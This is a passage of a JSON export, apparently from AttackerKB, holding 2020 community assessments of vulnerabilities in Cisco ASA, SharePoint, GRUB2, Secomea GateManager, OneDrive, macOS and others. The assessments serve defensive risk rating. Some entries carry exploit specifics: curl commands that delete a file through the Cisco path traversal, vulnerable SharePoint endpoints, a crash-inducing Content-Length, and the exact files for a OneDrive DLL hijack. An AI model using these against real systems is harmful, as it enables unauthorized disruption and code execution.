          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "a83f0db7-3283-4816-82a6-4bde4e44b8ed",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "63a96584-6094-4433-8ae0-1c1cd1b1c345",
      "created": "2020-07-22T19:24:35.120428Z",
      "revisionDate": "2020-10-31T16:04:14.941773Z",
      "document": "This just dropped from https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86\r\n\r\nNoted by https://twitter.com/ptswarm/status/1285974719821500423\r\n\r\nLooks like there is a PoC already, HT to @ccondon-r7 for spotting: https://twitter.com/aboul3la/status/1286012324722155525\r\n\r\nLimited scope in the advisory seems to indicate nothing hugely important would be revealed by this vuln, but it is probably very dependent on the configuration and nature of any company's particular deployment. And there tends to be a notion that once a path traversal vuln is found, folks often find new ways to expand their scope.",
      "score": 5,
      "metadata": {
        "tags": [
          "pre_auth",
          "no_useful_data",
          "common_enterprise",
          "easy_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "1aa199f1-8d16-446e-8cfd-7aa8c55e64ab",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "4bb7e01a-8043-47d9-9fe7-caac3eed7c32",
      "created": "2020-07-27T15:31:14.464006Z",
      "revisionDate": "2020-07-30T15:39:14.274754Z",
      "document": "The file deletion doesn't seem \"useful\" beyond disruption or denial of service against the web services. The files come back after a reboot, too. Not much \"attacker value\" here. The PoC is easy to weaponize, though, so please patch to avoid disruptions.\r\n\r\nETA: Hey, I can \"patch\" the vuln with the vuln:\r\n\r\n```\r\nwvu@kharak:~$ curl -kI https://[redacted]/+CSCOE+/session_password.html\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nTransfer-Encoding: chunked\r\nCache-Control: no-store\r\nPragma: no-cache\r\nConnection: Keep-Alive\r\nDate: Mon, 27 Jul 2020 19:57:23 GMT\r\nX-Frame-Options: SAMEORIGIN\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nX-Content-Type-Options: nosniff\r\nX-XSS-Protection: 1\r\nContent-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; frame-ancestors 'self'\r\n\r\nwvu@kharak:~$ curl -kb token=../+CSCOE+/session_password.html https://[redacted]/+CSCOE+/session_password.html\r\nwvu@kharak:~$ curl -kI https://[redacted]/+CSCOE+/session_password.html\r\nHTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nPragma: no-cache\r\nConnection: Close\r\nDate: Mon, 27 Jul 2020 19:57:35 GMT\r\nX-Frame-Options: SAMEORIGIN\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nX-Content-Type-Options: nosniff\r\nX-XSS-Protection: 1\r\nContent-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; frame-ancestors 'self'\r\n\r\nwvu@kharak:~$\r\n```\r\n\r\nThis uses the vulnerable file to delete itself.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "pre_auth",
          "easy_to_develop",
          "exploited_in_the_wild",
          "no_useful_data"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "07906b88-9407-497a-b3ba-66ec83fbf8f0",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "9772927e-d7aa-4c42-b8b0-1b598d66e84d",
      "created": "2020-07-27T22:19:59.092256Z",
      "revisionDate": "2020-08-06T00:06:19.416349Z",
      "document": "A deserialization vulnerability exists within Microsoft Sharepoint that could allow an attacker to execute code on the server within the context of the service account. The attacker would need to authenticate to Sharepoint and submit a specially crafted `POST` request to a specific resource that implements the `ContactLinksSuggestionsMicroView` or `InputFormContactLinksSuggestionsMicroView` control. The following two resources meet this requirement:\r\n\r\n* `/_layouts/15/quicklinks.aspx?Mode=Suggestion`\r\n* `/_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion`\r\n\r\nAlternatively, an attacker with the correct privileges may create a page which implements this.\r\n\r\nFor more information, see the details analysis posted to [srcincite.io](https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html) by Steven Seeley.",
      "score": 8,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "911de612-8ba7-4345-84dd-32ce3fc09227",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "b54a15a1-8d06-4902-83f9-dc10e40fa81a",
      "created": "2020-07-28T18:12:28.877016Z",
      "revisionDate": "2020-07-30T15:38:44.195674Z",
      "document": "The advisory isn't worded very well, but it seems that logging in to the SSL VPN with a different-case username than set will allow 2FA to be bypassed, opening up the VPN to password attacks, such as password spraying.\r\n\r\nSuccessful VPN access to an internal network can open up a lot of doors for an attacker, turning an external compromise into an authorized internal one. Many corporate services are hidden behind VPN. That said, proper network segmentation and secondary access controls can mitigate some of the risk. The \"attacker value\" is \"medium\" because this is just a 2FA bypass and also because of the listed caveats. It isn't terribly useful on its own.\r\n\r\nThe [KB article](https://kb.fortinet.com/kb/documentLink.do?externalID=FD37033) is written much better.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "92c1e499-db15-4a8b-9317-914a18bdebc2",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "9bc68457-02b8-47e9-8d37-cd9c803dc77d",
      "created": "2020-07-28T18:20:26.086517Z",
      "revisionDate": "2020-08-27T15:30:27.523921Z",
      "document": "I wonder if this has SSRF-to-RCE potential after reading the recent [security bulletin](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44516/).\r\n\r\nETA: Or just [target an admin](https://attackerkb.com/assessments/fa8015c3-22f6-482d-975b-2f30379edf76).",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "019032f7-3b41-483a-954b-cfd5dc88b250",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "1de0adec-8107-491a-bc8f-dcc3bf6eb3ab",
      "created": "2020-07-28T20:24:05.542238Z",
      "revisionDate": "2020-08-03T18:52:19.534371Z",
      "document": "I'm going to quote @hrbrmstr here: Since the registry config workaround doesn't require a system restart, it seems like this is going to be a niche exploitation issue for organizations that haven't config'd or patched their way to safety. \r\n\r\nStill haven't seen PoC past the [DoS from maxpl0it](https://attackerkb.com/assessments/62814b51-fcdd-4858-862c-eeb2f5890cf3) (which is a very good Twitter username, unrelatedly) that [surfaced quickly after the vuln details were published](https://attackerkb.com/assessments/62814b51-fcdd-4858-862c-eeb2f5890cf3). Anecdotally, a few other researchers have mused that this probably isn't the ripest or most valuable target for exploitation (famous last words, eh?).",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "pre_auth"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2b59559c-7638-42b0-b384-f9045b0dfffb",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "008571d4-6c23-4402-a8bc-0083e77098bc",
      "created": "2020-07-29T17:36:00.580253Z",
      "revisionDate": "2020-07-30T17:33:52.89405Z",
      "document": "This is a [web hosting control panel](https://en.wikipedia.org/wiki/Web_hosting_control_panel) for CentOS, sort of like [cPanel](https://en.wikipedia.org/wiki/CPanel). RCE in one of these could mean compromised user websites and data. Web hosting used to be super popular in the 2000s, but it has largely been supplanted by cheap virtualization and \"cloud\" platforms, IMHO.\r\n\r\nI make some assumptions about this vuln, since the code is [ionCube](https://en.wikipedia.org/wiki/IonCube)-protected, so there's no source, only PHP bytecode. Setup is also a nightmare, and there are no provisions for tracking or rolling back changes. Patching can get sketchy.\r\n\r\nI did not analyze the vuln, as attempting to install an older version of the software consequently broke it, and deobfuscating ionCube takes a significant amount of time.",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "difficult_to_patch",
          "high_privilege_access"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "f633677d-d229-4492-9bd3-08d25eb7dbca",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "d179c673-bb99-4f4c-9d19-8ff081a85c1f",
      "created": "2020-07-29T21:00:57.920041Z",
      "revisionDate": "2020-08-09T13:52:44.932417Z",
      "document": "A buffer overflow exists within GRUB2 affecting how it handles it's configuration file. An exception occurs when the contents of the configuration are too large for the buffer that is incorrectly handled causing the contents to be written anyways, thus over flowing the buffer.\r\n\r\nIn order to exploit this, an attacker would likely need either:\r\n* Physical access to an affected device and sufficient time to mount the disk and corrupt / infect the GRUB configuration file\r\n* Administrative access to running system to corrupt / infect the GRUB configuration file\r\n\r\nSuccessful exploitation of this vulnerability could corrupt the secure boot process and compromise the integrity of the system over all. This would effectively allow the installation and utilization of a bootkit. Developing a weaponized exploit would be aided by the lack of modern memory protections such as address space layout randomization (ASLR).\r\n\r\nPatching is a complicated process involving updating the firmware from the vendor and applying a denylist which must be done manually (for now at least).\r\n\r\nFor more information see the [Grubbing Secure Boot the Wrong Way: CVE-2020-10173](https://capsule8.com/blog/grubbing-secure-boot-the-wrong-way-cve-2020-10713/).",
      "score": 4,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "high_privilege_access",
          "default_configuration",
          "common_enterprise",
          "requires_elevated_access"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "3b8dfca6-5749-4bf8-bd03-d091ed41a576",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "10ea1efd-6c95-4b64-9784-a817b1822004",
      "created": "2020-07-30T03:06:49.83275Z",
      "revisionDate": "2020-08-05T20:47:22.95043Z",
      "document": "The exposed target population may be comparatively low to, say, the whole of the internet, but [Rapid7 Labs has noted](https://blog.rapid7.com/2020/07/29/remote-code-execution-risks-in-secomea-moxa-and-hms-ewon-ics-vpn-vulnerabilities-what-you-need-to-know/)\u2014rightly so\u2014that a couple thousand exposed gateways is still a pretty concerning state of affairs when those gateways are protecting *industrial control systems*. Pre-authenticated RCE in VPN products guarding ICS/OT networks during a pandemic is, as the kids say, bad news bears\u2014and that's not to make light, because this ain't light. The good news is that there are patches out for all these vulns, even though the downtime required to patch and verify effectively might be nothing to sneeze at. Longer [analysis and recommendations by smart people here](https://attackerkb.com/topics/lRQRKyIkBR/remote-code-execution-vulnerabilities-in-secomea-moxa-and-hms-ewon-vpns?#rapid7-analysis).\r\n\r\nResearchers from around Rapid7's world (and likely others, too!) have said today that there is likely lower-hanging fruit that will be surfaced in the coming days, particularly around nerve-wracking findings such as exposed Telnet administration ports. There's a lot of well-justified attention on this grouping of vulns, and with that attention comes increased focus on attack opportunities in general...and the stuff we see clogging up our security noise machines won't be the only stuff well-resourced attackers are paying attention to. Patch as soon as possible (and yep, easier said than done). ",
      "score": 3,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "548d7eeb-af29-445e-af8b-70a83fa56067",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "f70dfa93-8312-4dda-804a-ada91f8a8dd5",
      "created": "2020-07-31T15:50:42.626883Z",
      "revisionDate": "2020-08-06T23:29:59.542043Z",
      "document": "The web functionality is implemented in the x86 `gm_server` binary.\r\n\r\nUsing the [Claroty report](https://www.claroty.com/2020/07/28/vpn-security-flaws/) and a hunch, I decided to test the `Content-Length` header for negative values:\r\n\r\n> The discovered bug occurs due to improper handling of some of the HTTP request headers provided by the client.\r\n>\r\n> [snip]\r\n>\r\n> CVE-2020-14500 \r\n> IMPROPER NEUTRALIZATION OF NULL BYTE OR NULL CHARACTER CWE-158\r\n> An attacker can send a negative value and overwrite arbitrary data.\r\n\r\nOn the `/admin` page, setting `Content-Length` to a large negative value yielded a segfault in the `gm_server` process:\r\n\r\n```\r\n[30665.430945] gm_server[25115]: segfault at 56e35df1 ip 00000000566c0816 sp 00000000ffcb6bf0 error 6 in gm_server[565cf000+175000]\r\n[30665.430952] Code: e8 e8 ee f4 ff ff 89 c7 e9 61 fe ff ff 8d b4 26 00 00 00 00 8b 95 60 02 00 00 85 d2 0f 84 93 00 00 00 8b 85 68 02 00 00 31 ff <c6> 04 02 00 8b 45 14 83 f8 02 0f 84 34 fe ff ff 0f 82 84 02 00 00\r\n```\r\n\r\nNote that a watchdog restarts the process when it crashes.\r\n\r\nFor GateManager 8250 on Linux, the `gm_server` binary has NX and PIE enabled. The embedded 4260 and 9250 models have only NX:\r\n\r\n```\r\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\r\nNo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               22              gm_server.unpatched\r\n```\r\n\r\nExploitability of the embedded models seems high, given that PIE isn't enabled. NX and system ASLR can be bypassed with ROP.",
      "score": 3,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_patch",
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2691a058-a782-458c-a5db-d5963789e474",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "9ecc903b-3693-4337-88b5-f9280385c42c",
      "created": "2020-07-31T15:51:56.152231Z",
      "revisionDate": "2020-08-05T20:47:03.964497Z",
      "document": "The web server is a 32-bit, big-endian MIPS binary at `/magicP/WebServer/webs`.\r\n\r\nThe patch against the `websSecurityHandler()` function in `webs` is simplistic. If the cookie length is greater than the buffer size of 512 bytes, the function fails out:\r\n\r\n```diff\r\n char cookie[512];\r\n\r\n /* snip */\r\n\r\n if (wp->cookie != NULL) {\r\n   cookie_len = strlen(wp->cookie);\r\n+  if (512 < cookie_len) goto Fail;\r\n   memset(cookie, 0, 512);\r\n   strncpy(cookie, wp->cookie, cookie_len);\r\n   cookie[cookie_len] = '\\0';\r\n }\r\n```\r\n\r\nThe exploit mitigations on the binary are lacking:\r\n\r\n```\r\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE\r\nNo RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   1226) Symbols\t  No\t0\t\t17\t\twebs.unpatched\r\n```\r\n\r\nNo additional mitigations were enabled in the patched version. Funny enough, the binary still has debug symbols.\r\n\r\nExploitability seems high on this one, given the complete lack of mitigations. That said, you would not be able to copy null bytes with `strncpy(3)`.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_patch",
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f10a7142-eadb-4f08-a3f5-4ee3ee6f7605",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "fc9d50fc-c6f5-4a1a-a859-f3e33911c541",
      "created": "2020-07-31T21:04:58.040629Z",
      "revisionDate": "2020-09-30T16:40:11.182107Z",
      "document": "EDIT:  This is not a privilege escalation per se.  This overwrites the dll and gains injection, but it relies on a second user with greater privileges to log in and kick off OneDrive.\r\n\r\n\r\nThis exploit was not granted a CVE, but it was patched by an automated patch rollout.  Microsoft denied the CVE as the update will happen automatically (see [here]{https://labs.redyops.com/index.php/2020/04/27/onedrive-privilege-of-escalation/} for more information).\r\nThe exploit is a very simple dll hijacking vulnerability in the OneDrive executable.  The onedrive executable will attempt to load a specific (and often non-existant) dll if a specific config file is present.\r\nSpecifically, Onedrive will load the dll `C:\\Qt\\Qt-5.11.1\\qml\\QtQuick.2.7\\qtquick2plugin.dll` if the file `C:\\Qt\\Qt-5.11.1\\qml\\QtQuick.2.7\\qmldir` with the following contents:\r\n```\r\nmodule QtQuick \r\nplugin qtquick2plugin \r\nclassname QtQuick2Plugin \r\ntypeinfo plugins.qmltypes \r\ndesignersupported\r\n```\r\nOnedrive will load this dll into its trusted process if a user interacts with OneDrive.\r\n\r\nThis exploit is already patched and has a published Defender signature, but the service does not have to be in-use or logged in for the exploit to work.  In my testing, an unpatched Windows 10x64 1903 VM was vulnerable in the default configuration (apart from disabling defender).\r\n\r\nBecause this exploit is patched, automatically updated, and already has a signature for it, it will likely have a short shelf life in most locations, but it does provide an opportunity for exploitation of air-gapped or other system that does not talk to the internet.",
      "score": 3,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c0a0ad9e-c6f0-4663-af2f-f4476103807c",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "42f5fb3c-23e1-4765-87c8-cc074aa81f28",
      "created": "2020-08-03T18:46:13.19673Z",
      "revisionDate": "2020-08-23T18:39:42.517349Z",
      "document": "Not enough data ATM to accurately talk risk, but there's some concerning factors. Taking an educated guess an value & exploitability.\r\n\r\n> dom-based cross-site scripting\r\n\r\n> CVSS PR:N - No authentication required\r\n\r\n> Magento v1 just hit EOL and this patch is only v2.  It's not going to be a simple patch operation for many as they navigate dependencies from the v1 to v2 jump.\r\n\r\n> Magento put the mage in magecart - it's a popular target",
      "score": 4,
      "metadata": {
        "tags": [
          "difficult_to_patch"
        ],
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        }
      ]
    },
    {
      "id": "9f61cdd2-b6dc-49ed-a333-02362840dd2e",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "fbd23d1a-377f-4cd4-80f6-d224bc686ac6",
      "created": "2020-08-03T22:42:29.381378Z",
      "revisionDate": "2020-08-03T23:04:58.038987Z",
      "document": "Matt Shockley wrote a nice [blog post](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8), noted by @timwr and @ccondon-r7, on how to trivially bypass the TCC framework in MacOS by modifying the $HOME environment variable to point to an arbitrary TCC entitlement database that the attacker controls. What this means is that a post-exploitation implant will have an easy time bypassing TCC to access all files available to a user without any prompting.\r\n\r\nHowever, since this is a relatively new feature in Catalina, users of earlier macOS versions were already 'vulnerable' simply because this feature was not available. It may be some time before users expect this to be a real security boundary on macOS, though on iOS it is definitely more of an expectation.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "15bb647d-042c-4151-b651-e8a149e936d8",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "72725b13-8444-4a5a-b4e8-71cf57ff5c25",
      "created": "2020-08-03T23:17:43.367091Z",
      "revisionDate": "2020-08-04T18:07:05.700614Z",
